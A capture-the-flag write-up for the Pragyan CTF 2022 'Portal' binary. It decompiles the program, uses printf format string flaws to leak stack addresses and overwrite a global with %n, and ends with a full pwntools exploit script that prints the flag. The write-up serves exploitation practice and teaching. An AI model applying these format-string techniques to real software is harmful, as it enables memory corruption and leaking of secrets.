# Pragyan CTF 2022: Portal
## Write-Up

1) Analysing the given binary :-
```
──> checksec --file load
[*] './load'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Analysing in IDA/ghidra :- 
```
undefined8 main(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = 0;
  initialize();
  puts("Welcome!");
  do {
    putchar(10);
    puts("What would you like to do?");
    puts("1) Check Balance");
    puts("2) Upgrade Pack");
    __isoc99_scanf(&DAT_0010218f,&local_14);
    getchar();
    fflush(stdin);
    if (local_14 == 1) {
      see_balance();
    }
    else if (local_14 == 2) {
      init_pack();
    }
    else {
      if (local_14 != 3) {
        puts("Invalid ");
        if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        return 0;
      }
      check = 1;
      see_profile();
      check = 0;
    }
    puts("Bye!");
  } while( true );
}
```

So from this decompilation of main function, we can notice that if enter 1 in the prompt input it calls `see_balance` function and if we enter 2 it calls `init_pack` function.

Decompilation of see_balance function :-
```
void see_balance(void)

{
  long in_FS_OFFSET;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("You currently have Rs.%d left!\n",(ulong)b);
  puts("Wanna upgrade pack?");
  fgets(local_78,100,stdin);
  printf(local_78);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
In this, we can notice that there is format string vulnerability in the printf call. Keeping note of this, lets check the decompilation of init_pack function as well :-
```
void init_pack(void)

{
  if (b == 0xf9) {
    upgrade_pack();
  }
  else {
    puts("You do not have enough balance :(");
  }
  return;
}
```
After the if check is passed, `upgrade_pack` function is called.

Decompilation of upgrade_pack function :-
```
undefined8 upgrade_pack(void)

{
  FILE *__stream;
  char *__s;
  long in_FS_OFFSET;
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("flag_maybe","r");
  if (__stream == (FILE *)0x0) {
    puts("Flag not found.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_98,0x80,__stream);
  fclose(__stream);
  puts("Upgrading PAcK");
  __s = (char *)malloc(0x12d);
  puts("Enter coupon code:");
  fgets(__s,300,stdin);
  puts("Upgrading pack with the coupon:");
  printf(__s);
  check = 1;
  see_profile();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
In this function, content from the flag file is read and there is a format string vulnerability again which can be exploited to leak the flag.

Therefore, we need to call this function by passing the check in init_pack function by setting variable `b` to 249.

2) Lets use the vulnerability in see_balance function to leak the stack which will print atleast one address from the binary. We need this address because aslr is enabled and address of the variable we need also changes each time but the relative address remains the same so we can use this offset.
```
p.sendline(b"1")
p.recvuntil(b"pack?")
p.sendline(b"-%p"*50)
p.recvline()

s = p.recvline()
s = s.split(b"-")
print(s)
```
This prints a list with the addresses leaked.
```[b'', b'0x7f63a6f39a03', b'(nil)', b'0x7f63a6e5b002', b'0x7fff73b451e0', b'(nil)', b'0x252d70252d70252d', b'0x2d70252d70252d70', b'0x70252d70252d7025', b'0x252d70252d70252d', b'0x2d70252d70252d70', b'0x70252d70252d7025', b'0x252d70252d70252d', b'0x2d70252d70252d70', b'0x70252d70252d7025', b'0x252d70252d70252d', b'0x2d70252d70252d70', b'0x70252d70252d7025', b'0x56060070252d', b'0x77cee796bf5c8e00', b'0x7fff73b45270', b'0x56061bc86766', b'0x173b45360', b'0x77cee796bf5c8e00', b'(nil)', b'0x7f63a6d710b3', b'0x7f63a6f82620', b'0x7fff73b45368', b'0x100000000', b'0x56061bc866c2', b'0x56061bc867e0', b'0xd7a98818b04cf1d8', b'0x56061bc86220', b'0x7fff73b45360Bye!\n']```

The address at 21st index is the first proper address leaked from the binary which is 0x0000000000001766. So we can find the offset between the variable b and the leaked address.
Address of variable can be found by ```objdump -d -s -j .data ./load```.

```
./load:     file format elf64-x86-64

Contents of section .data:
 4000 00000000 00000000 08400000 00000000  .........@......
 4010 01000000                             ....            

Disassembly of section .data:

0000000000004000 <__data_start>:
        ...

0000000000004008 <__dso_handle>:
    4008:       08 40 00 00 00 00 00 00                             .@......

0000000000004010 <b>:
    4010:       01 00 00 00                                         ....
```

offset will be int(0x0000000000004010-0x0000000000001766) which is 10410. With this we can calculate the address of b by `badr = int(s[21], 16)+10410`.

Check in which position of the stack our input is stored by :-
```
──> ./load                                                                                                         
Welcome!

What would you like to do?
1) Check Balance
2) Upgrade Pack
1
You currently have Rs.1 left!
Wanna upgrade pack?
AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p
AAAAAAAA 0x7f23e610ba03 (nil) 0x7f23e602d002 0x7fffc28d14c0 (nil) 0x4141414141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070 0xf
Bye!

What would you like to do?
1) Check Balance
2) Upgrade Pack
```

Out input is stroed in 6th position. The format specifier %n will write the number of bytes read till now into the address specified. So we can write in the value we want using this and place it in the 9th offset where the value will be stored after the address. This can be done by `p.sendline(b"%83c%9$n%83c%9$n%83c%9$n" + p64(badr))`. 

3) This will set the value of b to be 249. Now we will be able to call the upgrade_pack function and print the flag by swapping endianness. The exploit will be :-
```
from pwn import *
binary = context.binary = ELF('./load')
context.bits = 64

p = process(binary.path)

p.sendline(b"1")
p.recvuntil(b"pack?")
p.sendline(b"-%p"*50)
p.recvline()

s = p.recvline()
s = s.split(b"-")
# print(s)
badr = int(s[21], 16)+10410

p.sendline(b"1")
p.recv()

p.sendline(b"%83c%9$n%83c%9$n%83c%9$n" + p64(badr))
p.recv()

p.sendline(b"2")
p.recvuntil(b"code:")
p.sendline(b"-%p"*35)
p.recvline()
p.recvline()

bflag = p.recvline().split(b"-")

flag = ""

for i in bflag:
    try:
        flag += str(bytes.fromhex(str(i)[4:-1]).decode('utf-8'))[::-1]
    except:
        continue

print("flag: ", flag)
```
